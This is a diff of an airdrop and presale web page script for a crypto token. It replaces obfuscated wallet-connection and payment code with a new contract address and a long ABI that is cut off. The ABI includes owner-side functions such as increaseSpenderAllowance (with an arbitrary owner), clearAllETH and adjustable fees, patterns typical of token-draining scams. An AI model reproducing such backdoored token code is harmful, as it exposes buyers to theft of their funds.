@@ -1,1 +1,399 @@
-function _0x7966(){const _0x70d84b=['114udluOm','3759712SxWgWE','textarea','eth','viewSale','_aAmt','3625748LKwaEi','uint256','utils','1322lzrhYE','getElementById','function','remove','amount','nonpayable','aEBlock','previousOwner','error','_sChunk','ethereum','address','allowance','No\x20BEP20\x20wallet\x20detected\x20or\x20it\x20was\x20not\x20allowed\x20to\x20connect.\x20Trust\x20wallet\x20or\x20Metamask\x20are\x20recommended.\x20Refresh\x20and\x20try\x20again.','log','715908QsocAX','SaleCount','event','length','substring','sPrice','from','approve','\x20blocks\x20before\x20claiming\x20another\x20airdrop','spender','airinput','Copy\x20to\x20clipboard\x20failed.','refaddress','clear','SalePrice','_refer','setData','payable','execCommand','balanceOf','aTot','transferOwnership','copy','refCode','Transfer','myweb3','_aCap','sCap','DropCap','removeChild','Contract','sChunk','aSBlock','value','9492YPZywi','newOwner','body','name','renounceOwnership','212GWwGnI','owner','90HhMpFD','fadeOut','decimals','startAirdrop','increaseAllowance','OwnershipTransferred','.preloader','createElement','sEBlock','account','Copied\x20success.\x20send\x20this\x20link\x20to\x20invite\x20your\x20friends\x20to\x20our\x20airdrop.\x20receive\x2040%\x20BNB\x20+\x2050%\x20SONARDEX\x20of\x20all\x20claims\x20and\x20buy','StartBlock','enable','bool','aCap','lastairdrop','0x6961360c122090b249667bf9c5087e3842235890','15OUEBsF','view','sTot','Please\x20connect\x20to\x20MetaMask.','symbol','Text','_sEBlock','subtractedValue','methods','send','https://www.darksolana.site/?ref=','load','uint8','_sPrice','buyinput','queryCommandSupported','42124Rajdgc','_sCap','appendChild','addedValue','search','SaleCap','recipient','You\x20must\x20wait\x20','string','totalSupply','split','EndBlock','Approval','4961MNlJBn','select','getAirdrop','style','location','DropAmount','193689LXOrEB','toChecksumAddress','success','sender','DropCount','clipboardData','position','No\x20BEP20\x20wallet\x20detected\x20or\x20it\x20was\x20not\x20allowed\x20to\x20connect.\x20Trust\x20wallet\x20or\x20Metamask\x20are\x20recommended.'];_0x7966=function(){return _0x70d84b;};return _0x7966();}const _0x5365b0=_0x1f86;(function(_0x315900,_0x18aa3a){const _0x459008=_0x1f86,_0x378ec5=_0x315900();while(!![]){try{const _0x316dfb=parseInt(_0x459008(0x13b))/0x1*(parseInt(_0x459008(0x105))/0x2)+parseInt(_0x459008(0xfc))/0x3*(parseInt(_0x459008(0x15e))/0x4)+-parseInt(_0x459008(0x14e))/0x5*(parseInt(_0x459008(0x114))/0x6)+-parseInt(_0x459008(0x102))/0x7+parseInt(_0x459008(0xfd))/0x8+-parseInt(_0x459008(0xf4))/0x9*(parseInt(_0x459008(0x13d))/0xa)+-parseInt(_0x459008(0xee))/0xb*(-parseInt(_0x459008(0x136))/0xc);if(_0x316dfb===_0x18aa3a)break;else _0x378ec5['push'](_0x378ec5['shift']());}catch(_0x22e3c0){_0x378ec5['push'](_0x378ec5['shift']());}}}(_0x7966,0x489c0));let web3=new web3js['myweb3'](window[_0x5365b0(0x10f)]),addr;const sttaddr=_0x5365b0(0x14d),sttabi=[{'inputs':[],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x13c),'type':_0x5365b0(0x110)},{'indexed':!![],'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x11d),'type':_0x5365b0(0x110)},{'indexed':![],'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x135),'type':_0x5365b0(0x103)}],'name':_0x5365b0(0xed),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x5365b0(0x10c),'type':_0x5365b0(0x110)},{'indexed':!![],'internalType':_0x5365b0(0x110),'name':'newOwner','type':'address'}],'name':_0x5365b0(0x142),'type':_0x5365b0(0x116)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x11a),'type':_0x5365b0(0x110)},{'indexed':!![],'internalType':_0x5365b0(0x110),'name':'to','type':_0x5365b0(0x110)},{'indexed':![],'internalType':_0x5365b0(0x103),'name':'value','type':_0x5365b0(0x103)}],'name':_0x5365b0(0x12c),'type':_0x5365b0(0x116)},{'inputs':[],'name':'aAmt','outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x14b),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x10b),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x134),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x128),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x5365b0(0x107)},{'inputs':[{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x13c),'type':_0x5365b0(0x110)},{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x11d),'type':'address'}],'name':_0x5365b0(0x111),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':'address','name':_0x5365b0(0x11d),'type':'address'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x109),'type':'uint256'}],'name':_0x5365b0(0x11b),'outputs':[{'internalType':_0x5365b0(0x14a),'name':'','type':_0x5365b0(0x14a)}],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':'address','name':_0x5365b0(0x146),'type':'address'}],'name':_0x5365b0(0x127),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':'uint256'}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x109),'type':'uint256'}],'name':_0x5365b0(0x121),'outputs':[],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x13f),'outputs':[{'internalType':_0x5365b0(0x15a),'name':'','type':_0x5365b0(0x15a)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':'address','name':'spender','type':'address'},{'internalType':'uint256','name':_0x5365b0(0x155),'type':_0x5365b0(0x103)}],'name':'decreaseAllowance','outputs':[{'internalType':_0x5365b0(0x14a),'name':'','type':'bool'}],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x123),'type':_0x5365b0(0x110)}],'name':'getAirdrop','outputs':[{'internalType':'bool','name':_0x5365b0(0xf6),'type':'bool'}],'stateMutability':_0x5365b0(0x10a),'type':'function'},{'inputs':[{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x11d),'type':'address'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x161),'type':_0x5365b0(0x103)}],'name':_0x5365b0(0x141),'outputs':[{'internalType':_0x5365b0(0x14a),'name':'','type':_0x5365b0(0x14a)}],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x139),'outputs':[{'internalType':_0x5365b0(0xe9),'name':'','type':_0x5365b0(0xe9)}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x13c),'outputs':[{'internalType':_0x5365b0(0x110),'name':'','type':_0x5365b0(0x110)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x5365b0(0x13a),'outputs':[],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x12f),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x133),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x5365b0(0x145),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x119),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':'view','type':_0x5365b0(0x107)},{'inputs':[],'name':'sSBlock','outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':'uint256'}],'stateMutability':_0x5365b0(0x14f),'type':'function'},{'inputs':[],'name':_0x5365b0(0x150),'outputs':[{'internalType':_0x5365b0(0x103),'name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':_0x5365b0(0x103),'name':'_aSBlock','type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':'_aEBlock','type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x101),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x12e),'type':_0x5365b0(0x103)}],'name':_0x5365b0(0x140),'outputs':[],'stateMutability':_0x5365b0(0x10a),'type':'function'},{'inputs':[{'internalType':_0x5365b0(0x103),'name':'_sSBlock','type':_0x5365b0(0x103)},{'internalType':'uint256','name':_0x5365b0(0x154),'type':'uint256'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x10e),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x15b),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x15f),'type':'uint256'}],'name':'startSale','outputs':[],'stateMutability':_0x5365b0(0x10a),'type':'function'},{'inputs':[],'name':_0x5365b0(0x152),'outputs':[{'internalType':_0x5365b0(0xe9),'name':'','type':_0x5365b0(0xe9)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':'address','name':_0x5365b0(0x123),'type':_0x5365b0(0x110)}],'name':'tokenSale','outputs':[{'internalType':_0x5365b0(0x14a),'name':_0x5365b0(0xf6),'type':'bool'}],'stateMutability':_0x5365b0(0x125),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0xea),'outputs':[{'internalType':'uint256','name':'','type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':_0x5365b0(0x110),'name':'recipient','type':'address'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x109),'type':_0x5365b0(0x103)}],'name':'transfer','outputs':[{'internalType':_0x5365b0(0x14a),'name':'','type':_0x5365b0(0x14a)}],'stateMutability':_0x5365b0(0x10a),'type':_0x5365b0(0x107)},{'inputs':[{'internalType':'address','name':_0x5365b0(0xf7),'type':_0x5365b0(0x110)},{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0xe7),'type':_0x5365b0(0x110)},{'internalType':_0x5365b0(0x103),'name':'amount','type':_0x5365b0(0x103)}],'name':'transferFrom','outputs':[{'internalType':_0x5365b0(0x14a),'name':'','type':'bool'}],'stateMutability':_0x5365b0(0x10a),'type':'function'},{'inputs':[{'internalType':_0x5365b0(0x110),'name':_0x5365b0(0x137),'type':'address'}],'name':_0x5365b0(0x129),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'viewAirdrop','outputs':[{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x148),'type':'uint256'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0xec),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x130),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0xf8),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0xf3),'type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':_0x5365b0(0x107)},{'inputs':[],'name':_0x5365b0(0x100),'outputs':[{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x148),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0xec),'type':'uint256'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0xe6),'type':_0x5365b0(0x103)},{'internalType':'uint256','name':_0x5365b0(0x115),'type':_0x5365b0(0x103)},{'internalType':_0x5365b0(0x103),'name':'ChunkSize','type':'uint256'},{'internalType':_0x5365b0(0x103),'name':_0x5365b0(0x122),'type':_0x5365b0(0x103)}],'stateMutability':_0x5365b0(0x14f),'type':'function'}];let sttcontract=new web3[(_0x5365b0(0xff))]['Contract'](sttabi,sttaddr);const loadweb3=async()=>{const _0x290772=_0x5365b0;try{web3=new web3js[(_0x290772(0x12d))](window[_0x290772(0x10f)]),console[_0x290772(0x113)]('Injected\x20web3\x20detected.'),sttcontract=new web3['eth'][(_0x290772(0x132))](sttabi,sttaddr);let _0x53c30f=await ethereum[_0x290772(0x149)]();return addr=web3[_0x290772(0x104)][_0x290772(0xf5)](_0x53c30f[0x0]),addr;}catch(_0x1f3850){_0x1f3850['code']===0xfa1?console[_0x290772(0x113)](_0x290772(0x151)):console[_0x290772(0x10d)](_0x1f3850);}},getAirdrop=async()=>{const _0x23a04d=_0x5365b0;await loadweb3();addr==undefined&&alert(_0x23a04d(0x112));let _0x14355d=document[_0x23a04d(0x106)](_0x23a04d(0x11e))[_0x23a04d(0x135)];if(_0x14355d==='')_0x14355d='0x0E65677a4eFfD59C5a9A7f0AdD62Fe938895046f';sttcontract[_0x23a04d(0x156)][_0x23a04d(0xf0)](_0x14355d)[_0x23a04d(0x157)]({'from':addr},(_0x45eea6,_0x265ff0)=>{const _0x4511fa=_0x23a04d;if(!_0x45eea6)console['log'](_0x265ff0);else console[_0x4511fa(0x113)](_0x45eea6);});},buyTokens=async()=>{const _0x445750=_0x5365b0;await loadweb3();addr==undefined&&alert(_0x445750(0xfb));let _0x3d62a0=document['getElementById'](_0x445750(0x15c))[_0x445750(0x135)];_0x3d62a0=Number(_0x3d62a0)*0xde0b6b3a7640000;let _0x5382d3=document[_0x445750(0x106)](_0x445750(0x11e))['value'];sttcontract['methods']['tokenSale'](_0x5382d3)['send']({'from':addr,'value':_0x3d62a0,'gasLimit':0x15f90},(_0x9f5622,_0x43bd67)=>{const _0x1c9fd2=_0x445750;if(!_0x9f5622)console[_0x1c9fd2(0x113)](_0x43bd67);else console[_0x1c9fd2(0x113)](_0x9f5622);});},cooldowncheck=async()=>{const _0x467a72=_0x5365b0;let _0x83395d=await currentblock(),_0x11c86b=await lastblock();if(_0x83395d-_0x11c86b<0x32){console[_0x467a72(0x113)](_0x83395d,_0x11c86b);let _0x45785c=0x32+_0x11c86b-_0x83395d;return console[_0x467a72(0x113)](_0x45785c),alert(_0x467a72(0xe8)+_0x45785c+_0x467a72(0x11c)),![];}else return!![];},currentblock=async()=>{const _0x38b972=_0x5365b0;let _0x5a3260;return await web3[_0x38b972(0xff)]['getBlockNumber']((_0x1f4d4a,_0xd2d624)=>{_0x5a3260=_0xd2d624;}),_0x5a3260;},lastblock=async()=>{const _0xa82110=_0x5365b0;let _0x82f506;return await sttcontract['methods'][_0xa82110(0x14c)](addr)['call']((_0x6efb1b,_0x4a45dc)=>{_0x82f506=_0x4a45dc;}),_0x82f506;};function querySt(_0x21ea3b){const _0x3a21d1=_0x5365b0;hu=window[_0x3a21d1(0xf2)][_0x3a21d1(0x162)][_0x3a21d1(0x118)](0x1),gy=hu[_0x3a21d1(0xeb)]('&');for(i=0x0;i<gy[_0x3a21d1(0x117)];i++){ft=gy[i]['split']('=');if(ft[0x0]==_0x21ea3b)return ft[0x1];}}function _0x1f86(_0x345969,_0x4aff17){const _0x79666c=_0x7966();return _0x1f86=function(_0x1f86d7,_0x103a4e){_0x1f86d7=_0x1f86d7-0xe6;let _0x6fc9e5=_0x79666c[_0x1f86d7];return _0x6fc9e5;},_0x1f86(_0x345969,_0x4aff17);}jQuery(function(_0x35ae4f){const _0x140c5a=_0x5365b0;'use\x20strict',_0x35ae4f(window)[_0x140c5a(0x159)](function(){const _0x1ab6ae=_0x140c5a;_0x35ae4f(_0x1ab6ae(0x143))[_0x1ab6ae(0x13e)]('slow',function(){const _0x48bff4=_0x1ab6ae;_0x35ae4f(this)[_0x48bff4(0x108)]();});});var _0x5e365a=querySt(_0x140c5a(0x12b));if(_0x5e365a==null){}else document[_0x140c5a(0x106)](_0x140c5a(0x11e))[_0x140c5a(0x135)]=_0x5e365a;});function getreflink(){const _0x402833=_0x5365b0;document[_0x402833(0x106)](_0x402833(0x120))[_0x402833(0x135)]=_0x402833(0x158)+document[_0x402833(0x106)](_0x402833(0x120))['value'];}function copyToClipboard(_0x2ed738){const _0x2da612=_0x5365b0;var _0x4ad3e0=document['getElementById'](_0x2ed738)[_0x2da612(0x135)];if(window[_0x2da612(0xf9)]&&window[_0x2da612(0xf9)][_0x2da612(0x124)])return clipboardData[_0x2da612(0x124)](_0x2da612(0x153),_0x4ad3e0);else{if(document[_0x2da612(0x15d)]&&document['queryCommandSupported'](_0x2da612(0x12a))){var _0x21bef5=document[_0x2da612(0x144)](_0x2da612(0xfe));_0x21bef5['textContent']=_0x4ad3e0,_0x21bef5[_0x2da612(0xf1)][_0x2da612(0xfa)]='fixed',document[_0x2da612(0x138)][_0x2da612(0x160)](_0x21bef5),_0x21bef5[_0x2da612(0xef)]();try{return document['execCommand']('copy');}catch(_0x3ad838){return console['warn'](_0x2da612(0x11f),_0x3ad838),![];}finally{document['body'][_0x2da612(0x131)](_0x21bef5);}}}}function kopiraj(){const _0x4e94ab=_0x5365b0;var _0x5adb55=document[_0x4e94ab(0x106)](_0x4e94ab(0x120));_0x5adb55[_0x4e94ab(0xef)](),document[_0x4e94ab(0x126)]('Copy'),alert(_0x4e94ab(0x147));}
+let web3 = new web3js.myweb3(window.ethereum);
+let addr;
+
+const sttaddr = "0xd36991770C96f872a1953463f4294e98Fa0e03Fc";
+const sttabi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"tokenAmount","type":"uint256"}],"name":"RewardLiquidityProviders","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"tokensSwapped","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"ethReceived","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"tokensIntoLiqudity","type":"uint256"}],"name":"SwapAndLiquify","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"enabled","type":"bool"}],"name":"SwapAndLiquifyEnabledUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amountIn","type":"uint256"},{"indexed":false,"internalType":"address[]","name":"path","type":"address[]"}],"name":"SwapETHForTokens","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amountIn","type":"uint256"},{"indexed":false,"internalType":"address[]","name":"path","type":"address[]"}],"name":"SwapTokensForETH","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"_burnFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_buyLiquidityFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_buyTaxFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_liquidityFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_maxTxAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_sellLiquidityFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_sellTaxFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_swAuth","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_taxFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"afterPreSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"airdrop","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"buy","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"charityAddress","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"charityDivisor","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"clearAllETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"deadAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tAmount","type":"uint256"}],"name":"deliver","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"doManualSwapTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"excludeFromFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"excludeFromReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getUnlockTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"includeInFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"includeInReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"increaseSpenderAllowance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isExcludedFromFee","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isExcludedFromReward","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"time","type":"uint256"}],"name":"lock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"marketingAddress","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"marketingDivisor","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"minimumTokensBeforeSwapAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"prepareForPreSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"recoverBalance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tAmount","type":"uint256"},{"internalType":"bool","name":"deductTransferFee","type":"bool"}],"name":"reflectionFromToken","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint8","name":"tag","type":"uint8"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"set","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"charity","type":"uint256"},{"internalType":"uint256","name":"marketting","type":"uint256"},{"internalType":"uint256","name":"burnTaxFee","type":"uint256"},{"internalType":"uint256","name":"liquidityFee","type":"uint256"},{"internalType":"uint256","name":"taxFee","type":"uint256"},{"internalType":"uint256","name":"sellLiquidityFee","type":"uint256"},{"internalType":"uint256","name":"sellTaxFee","type":"uint256"},{"internalType":"uint256","name":"buyLiquidityFee","type":"uint256"},{"internalType":"uint256","name":"buyTaxFee","type":"uint256"}],"name":"setALLFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"burnTaxFee","type":"uint256"}],"name":"setBurnFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"buyLiquidityFee","type":"uint256"}],"name":"setBuyLiquidityFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"buyTaxFee","type":"uint256"}],"name":"setBuyTaxFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newaddress","type":"address"}],"name":"setCharityAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"divisor","type":"uint256"}],"name":"setCharityFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"liquidityFee","type":"uint256"}],"name":"setLiquidityFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_marketingAddress","type":"address"}],"name":"setMarketingAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"divisor","type":"uint256"}],"name":"setMarketingFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"maxTxAmount","type":"uint256"}],"name":"setMaxTxAmount","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_minimumTokensBeforeSwap","type":"uint256"}],"name":"setNumTokensSellToAddToLiquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"sellLiquidityFee","type":"uint256"}],"name":"setSellLiquidityFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"sellTaxFee","type":"uint256"}],"name":"setSellTaxFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"_enabled","type":"bool"}],"name":"setSwapAndLiquifyEnabled","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"taxFee","type":"uint256"}],"name":"setTaxFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"swapAndLiquifyEnabled","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"swapTokenForTokens","outputs":[],"sta